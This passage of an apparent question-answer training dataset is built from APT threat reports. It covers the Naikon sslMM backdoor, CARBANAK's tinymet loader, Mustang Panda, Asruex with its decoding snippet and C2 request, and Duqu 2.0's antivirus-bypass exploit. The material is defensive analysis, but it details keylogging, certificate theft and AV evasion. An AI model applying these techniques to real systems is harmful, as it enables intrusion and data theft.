timing is uncanny because, in that same week speeches and views on nuclear disarmament and non-proliferation were presented by SE Asian country delegates to the United Nations in New York City. An example of such a (<http://www.un.org/disarmament/special/meetings/firstcommittee/67/pdfs/11%20Oct%20GD%20Cambodia.pdf>)talk (<http://www.un.org/disarmament/special/meetings/firstcommittee/67/pdfs/11%20Oct%20GD%20Cambodia.pdf>)is here; a naikon decoy's content was strikingly similar:\nMsnMM campaigns most commonly presented spear-phish exploits targeting CVE-2012-0158. A listing of screenshots in Appendix A reveals the variety of content and themes, all related to events and topics in the ASEAN region. Example titles include:\nThe following example's content was crafted to appear like a legitimate international agreement discussion. After the malicious document is opened and successfully exploits CVE-2012-0158 on the victim workstation, the exploit code drops and opens this decoy Word document:\nThis next example is written with the Laotian Phetsarath OT font, a decoy attempt to be a legitimate Daily News Brief from the Laotian Foreign Ministry of Affairs. It demonstrates the group's intentions to hit targets in Laos:\nAppendix A contains many more example document titles and screenshots. The themes and content that would appeal to politically-interested individuals in various parts of the world quickly become obvious.\nIn addition to a high volume of files exploiting CVE-2012-0158, the MsnMM attackers for a brief period used RTLO (right to left override) techniques, and then attachments exploiting CVE-2010-3333. An example of RTLO that creates and opens this decoy document to camouflage its malicious background activity, then dropping and executing MsnMM backdoors on its victim system:\nUNFC_Statement_final_rcs.pdf\nMedium Headline: SslMM\nThe MsnMM gang built and released many more variants of their sslMM creation. The code is a full-featured backdoor. Each variant of this tool starts by attempting to create a socket, and then creates a new thread implementing a fairly complicated keylogging facility not often seen, using Windows Keyboard Accelerators. Online code demonstrates the technique here:\nhttp://thronic.com/Win32%20Keylogging/\nThe backdoor retrieves a large number of victim system data points, which it then uses to check in to its hardcoded C2. The backdoor reports system identification information both to present the victim's identifying information and to fingerprint the system for asset management:\n\u2022 OS version\n\u2022 Service pack information\n\u2022 Processor speed\n\u2022 System name\n\u2022 Logged-on user name\n\u2022 OS install date\nOne of its more interesting features is the ability to fetch and use certificates from the \"My\" store on Windows systems. The \"My\" certificate store is created on a per-user basis, and this is where users' certificates are stored. It is reserved for each user for signing and decrypting data and encrypting network communications.\nFeature list:\n\u2022 Victim fingerprinting and performance sensitivity \u2013 system configuration collection\n\u2022 Persistence \u2013 immediately identifying the Start Menu Startup directory and dropping a LNK to its own executable disguised as a \"Office Start\", \"Yahoo Talk\", \"MSN Gaming Z0ne\", or \"MSN Talk\" shortcut\n\u2022 Configurable network settings \u2013 both a primary and backup C2 string is hard-coded in each backdoor. At this point, we are aware of almost 50 domains and unique IP addresses used to host C2\n\u2022 Keylogging facility \u2013 Windows Accelerators with hidden window and lengthy Accelerator table\n\u2022 Flexible network connectivity \u2013 proxy support for use with victim systems situated behind isolated networks\n\u2022 GET and POST network code for exfiltrating system information\n\u2022 Log file capabilities\n\u2022 File search and file write primitives \u2013 identifying and collecting sensitive ondisk information\n\u2022 Download and execute further arbitrary downloads\n\u2022 Arbitrary inter-process launch and communication through named pipes\n\u2022 Process privilege and token adjustments\n\u2022 Anti-malware kill-process identification and termination\n\u2022 Digital Certificate stealing and reuse for stealth SSL communications\n\u2022 Network server listener\nQuestion: What are the key features of the sslMM backdoor used by the Naikon APT, and how does it collect and utilize victim system data?",
    "output": "Answer: The sslMM backdoor used by the Naikon APT is a full-featured backdoor with several notable features. It starts by attempting to create a socket and implements a keylogging facility using Windows Keyboard Accelerators. It collects a large number of victim system data points, including OS version, service pack information, processor speed, system name, logged-on user name, and OS install date. These data points are used to check in to its hardcoded C2 and fingerprint the system for asset management. Additional features include persistence mechanisms, configurable network settings, proxy support, GET and POST network code for data exfiltration, log file capabilities, file search and write primitives, download and execution of further arbitrary downloads, inter-process communication, process privilege adjustments, anti-malware kill-process identification, digital certificate stealing for stealth SSL communications, and a network server listener.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Operators' Access To Source Code\nLet's look at two more related deductions from our blog post:\n\"Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s).\"\n\"Some of the operators may be compiling their own builds of the backdoor independently.\"\nThe first deduction was based on the following evidence:\n\"Despite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity. For example, on May 20, 2014, two builds were compiled approximately four hours apart and were configured to use the same C2 servers. Again, on July 30, 2015, two builds were compiled approximately 12 hours apart.\"\nTo investigate further, we performed a diff of two CARBANAK samples with very close compile times to see what, if anything, was changed in the code. Figure 6 shows one such difference.\nThe POSLogMonitorThread function is only executed in Sample A, while the blizkoThread function is only executed in Sample B (Blizko is a Russian funds transfer service, similar to PayPal). The POSLogMonitorThread function monitors for changes made to log files for specific point of sale software and sends parsed data to the C2 server. The blizkoThread function determines whether the user of the computer is a Blizko customer by searching for specific values in the registry. With knowledge of these slight differences, we searched the source code and discovered once again that preprocessor parameters were put to use. Figure 7 shows how this function will change depending on which of three compile-time parameters are enabled.\nThis is not definitive proof that operators had access to the source code, but it certainly makes it much more plausible. The operators would not need to have any programming knowledge in order to fine tune their builds to meet their needs for specific targets, just simple guidance on how to add and remove preprocessor parameters in Visual Studio.\nEvidence for the second deduction was found by looking at the binary C2 protocol implementation and how it has evolved over time. From our previous blog post:\n\"This protocol has undergone several changes over the years, each version building upon the previous version in some way. These changes were likely introduced to render existing network signatures ineffective and to make signature creation more difficult.\"\nFive versions of the binary C2 protocol were discovered amongst our sample set, as shown in Figure 8. This figure shows the first noted compile time that each protocol version was found amongst our sample set. Each new version improved the security and complexity of the protocol.\nIf the CARBANAK project was centrally located and only the template binaries were delivered to the operators, it would be expected that sample compile times should fall in line with the evolution of the binary protocol. Except for one sample that implements what we call \"version 3\" of the protocol, this is how our timeline looks. A probable explanation for the date not lining up for version 3 is that our sample set was not wide enough to include the first sample of this version. This is not the only case we found of an outdated protocol being implemented in a sample; Figure 9 shows another example of this.\nIn this example, a CARBANAK sample found in the wild was using protocol version 4 when a newer version had already been available for at least two months. This would not be likely to occur if the source code were kept in a single, central location. The rapid-fire fine tuning of template binaries using preprocessor parameters, combined with several samples of CARBANAK in the wild implementing outdated versions of the protocol indicate that the CARBANAK project is distributed to operators and not kept centrally.\nBig Headline: Names of Previously Unidentified Commands\nThe source code revealed the names of commands whose names were previously unidentified. In fact, it also revealed commands that were altogether absent from the samples we previously blogged about because the functionality was disabled. Table 1 shows the commands whose names were newly discovered in the CARBANAK source code, along with a summary of our analysis from the blog post.\nThe msgbox command was commented out altogether in the CARBANAK source code, and is strictly for debugging, so it never appeared in public analyses. Likewise, the ifobs command did not appear in the samples we analyzed and publicly documented, but likely for a different reason. The source code in Figure 10 shows the table of commands that CARBANAK understands, and the ifobs command (0x6FD593) is surrounded by an #ifdef, preventing the ifobs code from being compiled into the backdoor unless the ON_IFOBS preprocessor parameter is enabled.\nOne of the more interesting commands, however, is tinymet, because it illustrates how source code can be both helpful and misleading.\nBig Headline: The tinymet Command and Associated Payload\nAt the time of our initial CARBANAK analysis, we indicated that command 0xB0603B4 (whose name was unknown at the time) could execute shellcode. The source code reveals that the command (whose actual name is tinymet) was intended to execute a very specific piece of shellcode. Figure 12 shows an abbreviated listing of the code for handling the tinymet command, with line numbers in yellow and selected lines hidden (in gray) to show the code in a more compact format.\nThe comment starting on line 1672 indicates:\ntinymet command\nCommand format: tinymet {ip:port | plugin_name} [plugin_name] Retrieve meterpreter from specified address and launch in memory\nOn line 1710, the tinymet command handler uses the single-byte XOR key 0x50 to decode the shellcode. Of note, on line 1734 the command handler allocates five extra bytes and line 1739 hard-codes a five-byte mov instruction into that space. It populates the 32-bit immediate operand of the mov instruction with the socket handle number for the server connection that it retrieved the shellcode from. The implied destination operand for this mov instruction is the edi register.\nOur analysis of the tinymet command ended here, until the binary file named met.plug was discovered. The hex dump in Figure 12 shows the end of this file.\nThe end of the file is misaligned by five missing bytes, corresponding to the dynamically assembled mov edi preamble in the tasking source code. However, the single-byte XOR key 0x50 that was found in the source code did not succeed in decoding this file. After some confusion and further analysis, it was realized that the first 27 bytes of this file are a shellcode decoder that looked very similar to . Figure 13 shows the shellcode decoder and the beginning of the encoded metsrv.dll. The XOR key the shellcode uses is 0xEF47A2D0 which fits with how the five-byte mov edi instruction, decoder, and adjacent metsrv.dll will be laid out in memory.\nDecoding yielded a copy of metsrv.dll starting at offset 0x1b. When shellcode execution exits the decoder loop, it executes Metasploit's .\nIronically, possessing source code biased our binary analysis in the wrong direction, suggesting a single-byte XOR key when really there was a 27-byte decoder preamble using a four-byte XOR key. Furthermore, the name of the command being tinymet suggested that the was involved. This may have been the case at one point, but the source code comments and binary files suggest that the developers and operators have moved on to simply downloading Meterpreter directly without changing the name of the command.\nBig Headline: Conclusion\nHaving access to the source code and toolset for CARBANAK provided us with a unique opportunity to revisit our previous analysis. We were able to fill in some missing analysis and context, validate our deductions in some cases, and provide further evidence in other\ncases, strengthening our confidence in them but not completely proving them true. This exercise proves that even without access to the source code, with a large enough sample set and enough analysis, accurate deductions can be reached that go beyond the source code. It also illustrates, such as in the case of the tinymet command, that sometimes, without the proper context, you simply cannot see the full and clear purpose of a given piece of code. But some source code is also inconsistent with the accompanying binaries. If Bruce Lee had been a malware analyst, he might have said that source code is like a finger pointing away to the moon; don't concentrate on the finger, or you will miss all that binary ground truth. Source code can provide immensely rich context, but analysts must be cautious not to misapply that context to binary or forensic artifacts.\nIn the , we share details on an interesting tool that is part of the CARBANAK kit: a video player designed to play back desktop recordings captured by the backdoor.\n\nAnswer this question based on the above context: What insights does the tinymet command provide about the relationship between source code analysis and binary artifacts in the context of CARBANAK?",
    "output": "The tinymet command illustrates the complexities and potential pitfalls of relying solely on source code for analysis. Initially, the source code suggested that tinymet was designed to execute a specific piece of shellcode using a single-byte XOR key. However, further analysis revealed that the actual shellcode used a 27-byte decoder preamble with a four-byte XOR key. This discrepancy highlights that while source code can provide valuable context, it must be carefully correlated with binary artifacts to avoid misinterpretation. Analysts should not solely rely on the source code but also consider the actual behavior and structure of the binaries.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: EXECUTIVE SUMMARY\nSince at least 2019, the Mustang Panda threat actor group has targeted government and public sector organizations across Asia and Europe [3] with long-term cyberespionage campaigns in line with strategic interests of the Chinese government.\nIn November 2022, Mustang Panda shifted from using archive files to using malicious optical disc image (ISO) files containing a shortcut (LNK) file to deliver the modified version of PlugX malware. This switch increases the evasion against anti-malware solutions [2].\nThe Mustang Panda APT group loads the PlugX malware in the memory of legitimate software by employing a four-stage infection chain which leverages malicious shortcut (LNK) files, triggering execution via dynamic-link library (DLL) search-order-hijacking.\n\nQuestion: Why did the Mustang Panda threat actor group shift from using archive files to using malicious optical disc image (ISO) files containing a shortcut (LNK) file to deliver the modified version of PlugX malware? How does this change enhance their evasion tactics against anti-malware solutions?\n\nAnswer:",
    "output": "The Mustang Panda threat actor group shifted from using archive files to using malicious optical disc image (ISO) files containing a shortcut (LNK) file to deliver the modified version of PlugX malware in order to increase their evasion capabilities against anti-malware solutions. This change enhances their evasion tactics because ISO files are often perceived as less suspicious compared to traditional archive files, making it easier for the malware to bypass detection mechanisms employed by anti-malware solutions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: The need for action\nHowever, effective awareness requires continuous effort to remain vigilant. In this aspect the financial institutions seem to be doing a better job in understanding the potential \"enemy\" compared to the other industries, including the ENR sector.\nThe Obama administration submitted a cyber security proposal to Congress last May to outline its priorities for cyber security and to press lawmakers to pass comprehensive legislation to protect critical U.S. infrastructure that powers the Internet, utilities, and other control systems that are vulnerable to attack.\nFeds Simulate Crippling Cyber security Attack On NYC Electricity [March 2012]\nAdvances in technology and mounting concern about the potential for a cyber attack to damage power stations, water-treatment plants and other critical systems have prompted senior officials to seek a more robust role for the department's Cyber Command. For one thing, cyber attacks can take place in milliseconds. The assailant may be unknown. The attack route may be hard to trace, crossing multiple countries.\nPentagon proposes more robust role for its cyber-specialists [August 2012]\nIran is to move key ministries and state bodies off the worldwide internet next month in an effort to shield them behind a secure computer wall from disruptive cyber attacks like the Stuxnet and Flame viruses. \"The establishment of the national intelligence network will create a situation where the precious intelligence of the country won't be accessible to these powers.\"\nIran to unplug from Web to escape 'Internet monopoly' [August 2012]\nThe key is to be able to understand the motives behind a cyber attack. It must be made clear the cyber world is no longer playing in the \"minor league\", but rather the \"major league\" with players who potentially have access to unlimited resources and endless patience in achieving an aforementioned objective.\nOn a second note it is extremely necessary to conduct thorough analysis of risks and have a clear understanding of the different asset value perception. What seems of little value to one firm might be worth a lot more to attackers who have a totally different perspective or who are planning an attack on a chain of companies.\nAs a result, consideration should be given to the relationship between the costs for implementing detective controls and costs of incidents. The latter should include indirect damages incurred on consumer confidence and reputation, the two most valuable assets of a company.\nA 2012 survey titled \"A nuanced perspective on cybercrime\" which was conducted by KPMG in Netherlands,\nstated that out of the 170 responding organisations under various sectors including ENR, approximately 19 percent of them spend more than 1.5 million euros on cybercrime prevention, detection and response per year.\nThirdly, whether short term measures or long term controls have been implemented, the upper management of companies should never be complacent and believe that they enjoy 100 percent security. The IT landscape in many modern organisations is simply often too complex for complete protection.\nThe same 2012 KPMG survey also revealed that 45 percent of companies experienced attempts of cybercrime attacks in 2011. In addition, 55 percent of respondents were unsure of whether they can effectively respond to a cybercrime attack, and only 20 percent said they can respond effectively to an attack but unfortunately do not have an attack response plan in place. Among all the responding corporates, approximately 30 percent have forensic capabilities as a control and only 55 percent have central incident and event monitoring capabilities.\nMost importantly, it is vital for the management to set the correct tone. KPMG's experience with clients has shown over and over again that security is largely a management issue.\nThe survey also showed that more than 75 percent of respondents believe that fighting cybercrime goes beyond installing the needed technology to curb it. Some 90 percent of them also agree that cybercrime should be discussed at the board level.\nMedium Headline: So are companies in the ENR industry up to the challenge?\nMost respondents  from the ENR sector of the same KPMG survey do not think so. They believe that hackers are more likely to win in this sector compared to other industries.\nIf a company does not consider itself to be ready, actions must be taken. Management should endorse prevention efforts and start seeking a structured approach.\nThere also has to be effective use of security monitoring and seamless cooperation between the different parties involved so that knowledge and expertise can be shared among government, business communities, IT security groups and even cross-border organisations.\nBeyond the prevention of incidents, timely detection and an adequate\nresponse are also critical. If there is any major gap or deficiency in the policies, procedures and tools of a company, the worst time to discover these would be when a cyber security incident is already set on its course.\nIn terms of short-term actions, the company could perform risk analysis from the perspective of an attacker, identify and monitor critical assets as well as begin implementing a standby incident response team.\nIn the long run, companies should strive for cost-effective control of the cyber environment by addressing the domains of people, processes and technology.\nYet, even the most comprehensive security control system cannot guarantee the complete prevention of cyber incidents. An incident response plan and an emergency action plan is therefore\nalso of paramount value in the proper handling of a security compromise and reducing the subsequent damage.\nIf a thorough and detailed plan is not available, the very least an organisation should do is to be familiar with some basic concepts and simple primary actions to respond to an incident. (See Figure 5 below). This helps the company achieve more effective business resilience, which is important especially for the protection of the most critical assets. The fundamentals of cybersecurity are probably best summed up by Ron Ross, National Institute of Standards and Technology (NIST) Senior Fellow, who said during a launch of NIST's latest guidance on security controls: \"The fundamentals of cyber security \u2026 I call it the physics of security \u2026 don't change over time \u2026 how we apply those controls ... is a little bit different, but the same fundamentals.\"\nSource: 2012 KPMG paper \"A nuanced perspective on cybercrime\".\nMedium Headline: Suggested frameworks\nGiven the shifting perspective of the defence against cybercrime, a more modern approach to cyber security therefore also focuses on the perspective of the criminals.\nIn terms of risk assessment, the organisation must not only consider itself as an attractive end target, but also consider its part in the supply chain. It should also not view itself as one entity that should be protected, but as a collection of processes, users and IT infrastructure.\nCompanies should focus on being well informed of (the character) of possible threats and invest in a proper defence. They should not do this in an isolated way, but rather use the knowledge and experience of colleagues in both the public and private sector. A joint response is essential for protection\nagainst cyber espionage, terrorism, crime and disruption of information and communication systems.\nAnswer this question: What are the key components of a comprehensive cybersecurity strategy as suggested by the APT report 'energy-at-risk', and why are they important for companies in the ENR sector?",
    "output": "The key components of a comprehensive cybersecurity strategy as suggested by the APT report 'energy-at-risk' include effective use of security monitoring, seamless cooperation between different parties, timely detection, and an adequate response. These components are important because they help in sharing knowledge and expertise among government, business communities, IT security groups, and even cross-border organizations. Moreover, identifying gaps in policies, procedures, and tools before an incident occurs is crucial to minimize damage and ensure business resilience.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Asruex: Malware Infecting through Shortcut Files\nJPCERT/CC has been observing malicious shortcut files that are sent as email attachments to a limited range of organisations since around October 2015. When this shortcut file is opened, the host will be infected with malware called \"Asruex\". The malware has a remote controlling function, and attackers sending these emails seem to attempt intruding into the targets' network using the malware. According to a blog article by Microsoft, the malware is associated with an attacker group identified as \"DarkHotel\" (Microsoft calls it as \"Dubnium\") [1]. This blog entry will introduce the details of Asruex.\nBig Headline: Infection Mechanism of Asruex\nFigure 1 describes the chain of events after a victim opens the malicious shortcut file until the host gets infected with Asruex.\nFigure 1: Chain of events after a victim opens the malicious shortcut file until the host gets infected with Asruex\nFor those cases that JPCERT/CC has observed, when the shortcut file is opened, a downloader is downloaded from a C&C server and then executed. The downloader then downloads Asruex from another C&C server, which is then executed. Detailed behaviour observed in each phase will be explained in the next section.\nBig Headline: Details of the Shortcut File\nWhen the malicious shortcut file is opened, the following PowerShell command in the file is executed.\nThe above PowerShell command downloads a file from the specified URL, and it is saved as a batch file to be executed. The batch file contains the following commands, which execute PowerShell scripts (marked in red).\nWhen the batch file is executed, a Windows executable file (a downloader) and a dummy file for display will be downloaded from a C&C server, saved in %TEMP% folder and then executed. Those decoy documents are written in Japanese, but some are also in Chinese, which implies that the target for this attack is not limited to Japanese organisations.\nBig Headline: Details of the Downloader\nWhen the downloader is executed, it downloads a .jpg or .gif image file. Encoded Asruex is contained in the latter part of the image file. The downloader decodes it and then executes the malware.\nFigure 2: An Image File Containing Encoded Asruex\nAsruex contained in the image file is encoded using XOR. The following Python script is used for decoding the encoded data of the image file. The size of the encoded data is specified in the last 4 bytes of the image file.\nkey = 0x1D # Keys may vary depending on the sample\nkey += 0x5D key &=0xff\nThe downloader may contain an encoded executable file of Process Hacker (a multi-function task manager), and it may execute the Process Hacker if an anti-virus software is detected. Anti-virus software such as by Symantec, McAfee and Kaspersky, etc., are detected based on the process names.\nBig Headline: Details of Asruex\nAsruex is a kind of malware that communicates with the C&C server over HTTP, and executes the command received through the communication. It has various anti-analysis features such as preventing the malware from running when it detects a virtual machine. Please refer to Appendix A for conditions which Asruex detects a virtual machine. The malware is also capable of detecting anti-virus software.\nIf Asruex does not detect a virtual machine, it executes one of the following executable files, and injects a DLL file which is contained in Asruex. In case where it detects anti-virus software, Asruex generates a DLL file and loads it to itself (but does not perform DLL injection). This DLL file contains the core functions of Asruex.\nsdiagnhost.exe\nwksprt.exe\ntaskhost.exe\ndwm.exe\nwinrshost.exe\nwsmprovhost.exe\nctfmon.exe\nexplorer.exe\nThe DLL injected, or generated and loaded, sends an HTTP request to a dummy host. If it receives a reply of status code that is 100 or greater, it connects to an actual C&C server as follows:\nGET /table/list.php? a1=6fcadf059e54a19c7b96b0758a2d20a4396b85e77138dbaff3fddd04909de91\n62a8910eab1141343492e90a78e75bfa7cafa3ed0a51740daa4cad36291e637074255217 \u2013omitted-\nHTTP/1.1\nConnection: Keep-Alive\nContent-Type: text/plain; charset=utf-8\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/27.0.1453.116 Safari/537.36\nHost: [host name]\nAsruex operates based on the configuration information stored in itself. The configuration Information includes C&C servers and dummy hosts that it connects to, and also version information and a key to decode data which is delivered. For further details on the configuration information, please refer to Appendix B.\nThe configuration information is encoded. It can be decoded with the following Python code:\n(config_size,) = struct.unpack(\"=I\", data[offset:offset+4]) config_offset = offset + 4 encode_config = data[config_offset:config_offset+config_size] i=0 seed = config_size * 2 // It does not necessarily double while i < config_size: (result, seed) = rand_with_seed(seed) result &= 0xff decode_data.append(chr(ord(encode_config[i]) ^ result)) i += 1 decode_config = \"\".join(decode_data) (decode_size,) = struct.unpack(\"=I\", decode_config[config_size-4:config_size]) config = lznt1_decompress(decode_config, config_size, decode_size)\nAsruex executes commands that are received from a C&C server. Commands that are possibly executed are listed in Table 1. Most of the commands are used for collecting information, but some are for downloading DLL files (AdvProv.dll) from C&C servers and for executing them. AdvProv.dll is a plug-in to expand functions of Asruex.\nTable 1: Commands used by Asruex\nBig Headline: Details of AdvProv.dll\nAdvProv.dll is encrypted using XOR and 3DES. Decryption key is calculated based on the destination URL and the encoding key of the configuration information. Asruex downloads a DLL, loads it into the memory and executes DLL's export function, Get_CommandProc. AdvProv.dll adds the following commands to Asruex:\nTable 2: Asruex Commands added by AdvProv.dll\nSamples of AdvProv.dll that JPCERT/CC has observed had the listed functions. However, there may be some other versions with different functions.\nBig Headline: Appendix A: Conditions where Asurex detects an analysis environment\nIf Asruex detects itself being operated in an environment under any of the following conditions (Table A-1 to A-6), it recognises that it is an analysis environment and stops running.\nTable A-1: The user matches the computer name and user name as listed.\nTable A-2: Listing up the loaded modules, and if the listed functions are found to be exported.\nTable A-3: The listed file names are found.\nTable A-4: The listed process names are running.\nTable A-5: Listing up the process modules that are running, and the module version matches the combination listed.\nTable A-6: The disk name contains the listed strings.\nTable A-1: Detectable Combination of Computer Name and User Name\nBig Headline: Appendix C: SHA-256 Hash Value of Artifacts\nShortcut files:\nc60a93a712d0716a04dc656a0d1ba06be5047794deaa9769a2de5d0fcf843c2a\nae421dd24306cbf498d4f82b650b9162689e6ef691d53006e8f733561d3442e2\n980cc01ec7b2bd7c1f10931822c7cfe2a04129588caece460e05dcc0bb1b6c34\nb175567800d62dcb00212860d23742290688cce37864930850522be586efa882\nc2e99eedf555959721ef199bf5b0ac7c68ea8205d0dff6c208adf8813411a456\nac63703ea1b36358d2bec54bddfef28f50c635d1c7288c2b08cceb3608c1aa27\n5cfc67945dd39885991131f49f6717839a3541f9ba141a7a4b463857818d01e6\ne76c37b86602c6cc929dffe5df7b1056bff9228dde7246bf4ac98e364c99b688\n606e98df9a206537d35387858cff62eb763af20853ac3fa61aee8f3c280aaafe\nDownloaders:\nfdf3b42ac9fdbcabc152b200ebaae0a8275123111f25d4a68759f8b899e5bdd6\ndd2cba1a0d54a486a39f63cbd4df6129755a84580c21e767c44c0a7b60aff600\nd89e2cc604ac7da05feeb802ed6ec78890b1ef0a3a59a8735f5f772fc72c12ef\ncaefcdf2b4e5a928cdf9360b70960337f751ec4a5ab8c0b75851fc9a1ab507a8\n8ca8067dfef13f10e657d299b517008ad7523aacf7900a1afeb0a8508a6e11d3\n77ca1148503def0d8e9674a37e1388e5c910da4eda9685eabe68fd0ee227b727\n05f241784e673f2af8a2a423fb66e783a97f123fc3d982144c39e92f191d138d\na77d1c452291a6f2f6ed89a4bac88dd03d38acde709b0061efd9f50e6d9f3827\n2273236013c1ae52bfc6ea327330a4eba24cc6bc562954854ae37fe55a78310b\n36581a19160f2a06c617a7e555ad8ec3280692442fd81bde3d47a59aea2be09a\na3f1a4a5fea81a6f12ef2e5735bb845fb9599df50ffd644b25816f24c79f53b6\n24b587280810fba994865d27f59a01f4bbdaf29a14de50e1fc2fadac841c299e\n2c68cf821c4eabb70f28513c5e98fa11b1c6db6ed959f18e9104c1c882590ad2\n3f2168a9a51d6d6fe74273ebfc618ded3957c33511435091885fa8c5f854e11e\ndf72a289d535ccf264a04696adb573f48fe5cf27014affe65da8fd98750029db\neacc46f54fa8c8a8cf51368305803d949fa2625066ec634da9a41d08f2855617\ne139a8916f99ce77dbdf57eaeac5b5ebe23367e91f96d7af59bee7e5919a7a81\n8a6d76bd21e70a91abb30b138c12d0f97bb4971bafa072d54ce4155bea775109\n35fc95ec78e2a5ca3c7a332db9ca4a5a5973607a208b9d637429fe1f5c760dd5\nAsruex:\n8af41d303db8a975759f7b35a236eb3e9b4bd2ef65b070d19bd1076ea96fa5c4\na9ce1f4533aeec680a77d7532de5f6b142eb8d9aec4fdbe504c37720befe9ce3\n9350f7eb28f9d72698216105c51a4c5ad45323f907db9936357d6914fc992c90\n694de22c0b1a45c0e43caaa91486bc71a905443b482f2d22ded16b5ce3b0e738\n18e12feeb3fb4117ca99e152562eada2eb057c09aab8f7a424e6d889f70feb6c\n148a834e2717d029a4450dfa7206fd7d36c420edb95068c57766da0f61b288e8\nd869ce2ba491713e4c3f405ad500245d883b0e7b66abeee2522e701c8493388a\nfca19a78fc71691f3f97808624b24f00dd1f19ccadcc6e3a7e2be5b976d8937b\neb31f931f0e2abf340f3f95861a51e30677fd4216b2e4ee4d8570b41cb41249c\n7a95930aa732d24b4c62191247dcdc4cb483d8febaab4e21ca71fec8f29b1b7c\nAdvProv.dll\nf06000dceb4342630bf9195c2475fcd822dfe3910b0fa21691878071d0bb10fc\nOthers\n6d4e7d190f4d7686fd06c823389889d226ea9c8524c82c59a765bba469f2f723\ne7d51bb718c31034b597aa67408a015729be85fc3aefcc42651c57d673a4fe5a\n7074a6d3ab049f507088e688c75bae581fad265ebb6da07b0efd789408116ec8\n\nBased on the above text, answer a question. How does Asruex communicate with its Command and Control (C&C) server, and what types of commands can it execute upon receiving instructions?",
    "output": "Asruex communicates with its C&C server over HTTP. It first sends an HTTP request to a dummy host and, upon receiving a valid response, connects to the actual C&C server. Asruex can execute various commands received from the C&C server, including commands for collecting information and downloading additional DLL files (AdvProv.dll) to expand its functionality. These commands allow Asruex to perform actions such as gathering system information, executing additional payloads, and interacting with the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Duqu 2.0 malware achieve kernel-level access on 64-bit systems, and what specific exploit and driver does it utilize to bypass antivirus detections?",
    "output": "The Duqu 2.0 malware achieves kernel-level access on 64-bit systems by utilizing a Windows kernel mode exploit contained in the 'CTwoPENC.dll' module. This exploit leverages a zero-day vulnerability in 'win32k.sys' (CVE-2015-2360) to gain kernel privileges while running as an unprivileged user. The exploit creates several windows with specific class names and manipulates callback pointers. If successful, it decompresses and loads a driver named 'KMART.dll' into kernel mode. 'KMART.dll' implements a kernel-mode attack against the Kaspersky Lab products filter 'klif.sys', patching the import table addresses of system API functions to impersonate malicious modules as coming from the 'avp.exe' process, thereby evading monitoring by the anti-virus software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What strategies does China employ to control and monitor internet usage within its borders, and how might these strategies be leveraged for cyber warfare?",
    "output": "China employs various strategies to control and monitor internet usage, including censorship of websites like YouTube and Yahoo!, and the use of surveillance tools to track online activities. These strategies can be leveraged for cyber warfare by providing China with the capability to manipulate information flow, suppress dissent, and gather intelligence on both domestic and international targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Union Election\t Commission Website Malware: August-October, 2015\nSeveral additional malware files were discovered on the Myanmar Union\t Election Commission (UEC) website since the prior report that\t was initially published on August\t 17, 2015 [4].\nThe presence of new malware after the initial notification process from Arbor indicates an ongoing compromise of the site and possibly related sites and suggests that\t a\t more diligent\t Incident\t Response process was required to discover all of the compromised infrastructure and victims of the malware activity.\nThese newer files and related content\t shall be analyzed herein.\nSmall Headline: Malware #1-6: Six RAR Files Containing PlugX, EvilGrab, an unknown malware, and the Trochilus RAT\nAs documented in the \"Defending the White Elephant\" paper, several RAR\t files containing malware were discovered on the UEC website in the past.\tAs of October 20, 2015 a\t new file was discovered at\t http://www.uecmyanmar[.]org/dmdocuments/UEC-Invitation.rar and was present\t as of November 2015. Following the trail left\t by this malware has helped ASERT uncover other related threat\t activity to include a\t cluster of six malware packages stored in RAR\t file format\t on a\t staging/distribution server.\nSmall Headline: Malware #7: 3102 Variant of the 9002 RAT in Firefox Plugin\nAn additional malware file was stored at\t http://www.uecmyanmar[.]org/plugins/system/jatabs/jatabs/FlashVideoPlayer.php and was submitted to VirusTotal on August\t 21, 2015 from Japan and later on October 13 from Singapore.\t FlashVideoPlayer.php contained a\t ZIP file that\t stored a\t Firefox plugin, which was used to launch the 3102 variant\t of the 9002 RAT. Another instance of this RAT was also mentioned by Citizen Lab in their report, \"Targeted Malware Attacks against\t NGO Linked to Attacks on Burmese Government\t Websites\". The presence of the exact\t same RAT family inside the fake Firefox Plugin on the UEC website creates a\t link between this artifact\t and attacks on the unnamed NGO that\t were discussed inside the Citizen Lab report.\nSmall Headline: Malware set #1: Six RAR files (two PlugX, one EvilGrab, one unknown, two Trochilus RAT)\nFigure 1: Screenshot of website containing additional malware (UEC-Invitiation.rar) as of October 20, 2015\nThe newly observed file, stored in a\t RAR, is a\t storage tactic that\t has been\tpreviously \tobserved\t on the same site. Two prior filenames (discussed in the White Elephant\t report) were invitations.rar and PlanProposal.rar.\nInside the UEC-Invitation.rar file there is a\t folder called UEC Invitation that\t contains another folder called Invitation. Inside this folder is a\t shortcut\t file, Invitation.LNK with a\t timestamp of August\t 24, 2015. Analysis of the .LNK file turns up some interesting elements, such as the use of PowerShell inside the Target\t field, \twhich\t performs a\t download and execute of additional malware.\nFigure 2: Analysis of the .LNK file reveals malicious Powershell\nAnalysis of the LNK file metadata\t property store reveals some interesting aspects of the malware.\nFigure 3: In-depth analysis of .LNK metadatda\nOf interest\t is the System.ItemTypeText\t value (a\t so-called \"friendly name\" of a\t Windows element that\t is displayed during the use of an application) of UNDP, which may stand for the United Nations Development\t Program, the UN's global development\t network. The Myanmar-focused page for the UNDP [www.mm.undp.org] describes their mission as follows: \"In Myanmar, UNDP provides support\t to the national political and socio-economic reforms that\t underpin the country's transition\". Therefore, the UNDP, or those that\t work with the UNDP may have been targeted and may still be a target.\nThe System.DateCreated and System.DateModified values show September 15, 2014, which could indicate that\t campaign activity has been underway for over a\t year. It\t is also possible that\t this date could be modified.\nThe next\t two fields of 